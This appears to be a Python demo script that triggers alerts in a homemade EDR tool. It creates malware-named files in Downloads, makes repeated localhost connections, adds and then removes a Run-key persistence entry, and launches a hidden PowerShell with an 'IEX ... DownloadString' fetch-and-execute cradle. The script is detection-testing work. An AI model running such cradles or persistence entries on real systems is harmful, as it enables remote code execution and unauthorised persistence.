import os
import sys
import time
import socket
import hashlib
import subprocess
from pathlib import Path

print("[*] NightWatch EDR demo trigger starting...")
print("    Make sure your Flask EDR (app.py) is running.\n")

def get_downloads_dir() -> Path:
    # default to %USERPROFILE%\Downloads
    user = os.path.expandvars(r"%USERPROFILE%")
    return Path(user) / "Downloads"


def write_suspicious_files():
    """
    Create and modify suspicious-looking files in monitored directories:
    - Downloads\edr_demo_malware.exe
    - Downloads\edr_demo_script.ps1
    This should trigger File-System / File Integrity alerts.
    """
    downloads = get_downloads_dir()
    downloads.mkdir(parents=True, exist_ok=True)

    exe_path = downloads / "edr_demo_malware.exe"
    ps1_path = downloads / "edr_demo_script.ps1"

    print(f"[*] Creating suspicious files in {downloads} ...")
    try:
        exe_path.write_bytes(os.urandom(2048))
        ps1_path.write_text("# demo script for EDR – not malicious\nWrite-Host 'EDR demo'")

        print(f"    Created {exe_path}")
        print(f"    Created {ps1_path}")

        # Modify the exe again after a short pause to trigger "modified" alert
        time.sleep(3)
        exe_path.write_bytes(os.urandom(1024))
        print(f"    Modified {exe_path} to trigger integrity change")
    except Exception as e:
        print(f"[!] Error creating demo files: {e}")


def spike_network_activity():
    """
    Rapidly create outbound connections to suspicious ports.
    EDR looks at remote port (4444, 1337, 6666, 9001 etc).
    We'll connect to localhost on port 9001 repeatedly.
    """
    print("[*] Generating suspicious network traffic on port 9001 ...")

    for i in range(60):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            # This will usually fail (no server), but OS will still create a connection attempt
            s.connect_ex(("127.0.0.1", 9001))
            s.close()
        except Exception:
            pass
        time.sleep(0.05)

    print("    Network spike done.")


def spawn_suspicious_powershell():
    """
    Spawn a PowerShell process with an encoded command / web download pattern.
    Your EDR should flag this as 'Suspicious PowerShell usage'.
    """
    print("[*] Spawning suspicious-looking PowerShell ...")
    cmd = [
        "powershell",
        "-NoProfile",
        "-WindowStyle", "Hidden",
        "-Command",
        "IEX (New-Object Net.WebClient).DownloadString('http://example.com/demo.ps1')"
    ]

    try:
        # We don't care about its output; let it run briefly
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"    PowerShell PID={proc.pid}")
        time.sleep(5)
        proc.terminate()
    except FileNotFoundError:
        print("    PowerShell not found – skipping this part.")
    except Exception as e:
        print(f"    Error starting PowerShell: {e}")


def spawn_many_short_processes():
    """
    Spawn multiple short-lived CMD processes to bump process count and
    potentially trigger anomaly / process-based alerts.
    """
    print("[*] Spawning many short-lived cmd.exe processes ...")
    procs = []
    for i in range(20):
        try:
            p = subprocess.Popen(
                ["cmd", "/c", "echo EDR demo"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            procs.append(p)
        except Exception:
            pass
        time.sleep(0.15)

    # Give them a moment to exist so the EDR can see them
    time.sleep(3)
    for p in procs:
        try:
            p.terminate()
        except Exception:
            pass
    print("    Burst of processes completed.")


def add_registry_run_entry():
    """
    Add and then remove a Run key under HKCU to demonstrate persistence detection.
    Requires Windows; safe because we clean up after.
    """
    try:
        import winreg
    except ImportError:
        print("[*] winreg not available or not on Windows – skipping registry demo.")
        return

    print("[*] Adding temporary Run key for persistence demo ...")
    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "NightWatchDemo"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey, 0, winreg.KEY_SET_VALUE)
    except PermissionError:
        print("    No permission to set HKCU Run key – skipping.")
        return
    except FileNotFoundError:
        print("    HKCU Run key not found – skipping.")
        return

    try:
        # Just point to python.exe as a harmless path
        path = sys.executable
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, path)
        print(f"    Added Run entry '{value_name}' -> {path}")
        time.sleep(5)  # give EDR time to snapshot and detect
        winreg.DeleteValue(key, value_name)
        print("    Removed Run entry again (cleanup).")
    except PermissionError:
        print("    Permission error while setting Run key.")
    except Exception as e:
        print(f"    Registry error: {e}")


def show_own_hash_for_signature_demo():
    """
    Print SHA-256 of the Python executable.
    You can copy this into your MALWARE_HASHES in app.py to see a Critical alert.
    """
    exe = sys.executable
    print("\n[*] Computing SHA-256 of current Python interpreter for signature demo ...")
    print(f"    Executable path: {exe}")

    h = hashlib.sha256()
    try:
        with open(exe, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                h.update(chunk)
        digest = h.hexdigest()
        print(f"    SHA-256: {digest}")
        print("\n    -> To demo hash-based detection:")
        print("       1. Open app.py")
        print("       2. Find MALWARE_HASHES = { ... }")
        print("       3. Add this line inside:")
        print(f"          \"{digest}\": \"PythonInterpreterDemo\",")
        print("       4. Restart the EDR and this Python process should show as CRITICAL.\n")
    except Exception as e:
        print(f"    Could not hash interpreter: {e}")


# ----------------- MAIN -----------------


def main():
    print("This script will generate harmless but suspicious activity so your EDR can detect it.")
    print("Actions:")
    print("  • Create & modify suspicious .exe/.ps1 files in Downloads (File Integrity)")
    print("  • Spawn suspicious PowerShell (Process / Behavioral)")
    print("  • Spike network connections to port 9001 (Network anomalies)")
    print("  • Spawn many short cmd.exe processes (Anomaly / Process)")
    print("  • Add & remove HKCU Run key (Registry / Persistence)")
    print("  • Print SHA-256 for hash-based signature demo\n")

    time.sleep(2)

    write_suspicious_files()
    spawn_suspicious_powershell()
    spike_network_activity()
    spawn_many_short_processes()
    add_registry_run_entry()
    show_own_hash_for_signature_demo()

    print("\n[*] Demo activity finished.")
    print("    Open your NightWatch EDR web UI and check:")
    print("      - Threat Detection (alerts with severities)")
    print("      - Network Monitor")
    print("      - File Integrity")
    print("      - Event Logs / Engine Logs\n")


if __name__ == "__main__":
    main()
